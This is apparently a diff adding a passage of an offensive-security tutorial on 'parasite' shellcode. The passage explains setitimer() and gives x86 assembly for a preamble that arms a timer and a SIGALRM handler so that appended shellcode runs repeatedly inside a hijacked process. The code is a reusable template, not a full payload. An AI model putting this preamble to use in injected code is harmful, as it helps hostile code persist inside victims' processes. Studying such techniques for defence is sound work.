@@ -1,0 +1,93 @@
+We will use ITIMER_REAL because it allows the generation of signal at
+regular intervals, and is not influenced by environmental factors such as
+the workload of a system.
+
+The argument "const struct itimerval *new_value" points to an itimerval
+structure, defined as:
+
+struct itimerval {
+    struct timeval it_interval; /* next value */
+    struct timeval it_value;    /* current value */
+};
+
+struct timeval {
+    long tv_sec;                /* seconds */
+    long tv_usec;               /* microseconds */
+};
+
+The last timeval structure, it_value, is the period between the calling of
+the function and the first timer interrupt. If zero, the alarm is disabled.
+
+The second one, it_interval, is the period between successive timer
+interrupts. If zero, the alarm will only be sent once.
+
+We'll set both structures at the same time interval.
+
+The last argument, "struct itimerval *old_value", if not NULL, will be set
+by the function at the value of the previous timer. We'll not use this
+feature.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+# setitimer parasite
+
+setitimer_hdr:
+    pusha
+    # sys_setitimer(ITIMER_REAL, *struct_itimerval, NULL)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    xorl    %edx, %edx
+    mov     $104, %al
+    jmp     struct_itimerval # load itimervar structure
+load_struct:
+    pop     %ecx
+    int     $0x80
+    popa
+    jmp     handler
+
+struct_itimerval:
+    call    load_struct
+    # itimerval structure: you can modify the values
+    # to set your time intervals
+    .long    0x0       # seconds
+    .long    0x5000    # microseconds
+    .long    0x0       # seconds
+    .long    0x5000    # microseconds
+
+# signal handler, called by the timer
+handler:
+    pusha
+    # signal(SIGALRM, handler)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    mov    $48, %al
+    mov    $14, %bl
+    jmp    handler_end   # load handler_end address
+load_handler:
+    pop    %ecx
+    subl    $0x19, %ecx  # adjust %ecx to point handler()
+    int    $0x80
+    popa
+    jmp    shellcode
+
+handler_end:
+    call load_handler
+
+shellcode:        # append your shellcode here
+    # ...
+    # ...
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The usage of this preamble is similar to the previous (alarm) one, there
+is only the necessity of a fine-tuned timer: a compromise between the
+frequency of executions and the stability of the parasite, which must be
+able to carry out its operations in less time than a timer's cycle.
+
+You can work around this problem by transforming these preambles
+(including the preamble that makes use of alarm()) in epilogues, so that
+the timer starts counting only after the parasite has finished its
+operations.
+
+In fact we are going to see how this was implemented in the real parasites
+presented below.
